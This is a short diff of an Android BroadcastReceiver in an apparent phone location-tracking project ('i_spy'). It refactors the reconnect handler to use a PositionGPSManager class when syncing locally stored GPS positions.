@@ -6,8 +6,8 @@ import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 
+import com.um.asn.i_spy.manager.PositionGPSManager;
 import com.um.asn.i_spy.models.Phone;
-import com.um.asn.i_spy.models.PositionGPS;
 
 public class ConnectionListener extends BroadcastReceiver {
 
@@ -24,8 +24,8 @@ public class ConnectionListener extends BroadcastReceiver {
 
             Phone phone = new Phone();
             phone.loadWithFile(context);
-            PositionGPS posGPS = new PositionGPS(context, phone);
-            posGPS.insertDistFromLocal((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE));
+            PositionGPSManager posGPS = new PositionGPSManager(context, phone);
+            posGPS.insertDistFromLocal();
         }
         else{
             System.out.println("Disconnected !");
